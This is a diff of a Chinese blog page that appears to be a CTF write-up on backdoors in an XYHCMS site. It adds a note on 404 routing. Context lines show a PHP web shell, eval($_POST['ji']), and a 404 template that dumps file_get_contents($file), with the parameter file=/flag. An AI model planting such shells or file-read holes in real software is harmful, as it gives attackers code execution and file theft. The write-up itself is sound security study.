@@ -176,7 +176,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-11-23 20:34:50 / 修改时间：21:23:50" itemprop="dateCreated datePublished" datetime="2021-11-23T20:34:50+08:00">2021-11-23</time>
+              <time title="创建时间：2021-11-23 20:34:50 / 修改时间：21:59:10" itemprop="dateCreated datePublished" datetime="2021-11-23T20:34:50+08:00">2021-11-23</time>
             </span>
 
           
@@ -236,10 +236,12 @@
 <h4 id="index.php">index.php</h4>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//location end</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ji&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>同样是在文件末尾包含了一个eval函数，利用POST传参，由于这时无法看到（修正），在检查-网络-搜索中搜索flag，在响应标签的201行可以发现目的数据。</p>
-<h4 id="varwwwhtmlpublichomedefault404.html">/var/www/html/Public/Home/default/404.html</h4>
+<h4 id="html">404.html</h4>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;a title=<span class="string">&quot;官方网站&quot;</span> href=<span class="string">&quot;http://www.xyhcms.com&quot;</span>&gt;XYHCMS&lt;/a&gt; [ <span class="meta">&lt;?php</span> var_dump(file_get_contents(<span class="variable">$file</span>)); <span class="meta">?&gt;</span> ]&lt;/p&gt;</span><br><span class="line"><span class="comment">//file_get_contents 是将文件读入一个字符串</span></span><br><span class="line"><span class="comment">//var_dump 是打印变量的相关信息</span></span><br><span class="line"><span class="comment">//此传参会导致打印相关文件内容，未提示的是前面有对$file的POST代码块</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载index.php+不存在的地址如0000.php转到404</span></span><br><span class="line"><span class="comment">//file=/flag</span></span><br></pre></td></tr></table></figure>
 <p>如果是采取手动，则继续在检查-网络中查找flag{</p>
+<h5 id="注意">注意：</h5>
+<p>index.php可以看作索引，当索引的内容不在索引目录中时会跳转到404.html的模板中，而本次的模板恰好含有打印的代码。</p>
 
       
     </div>
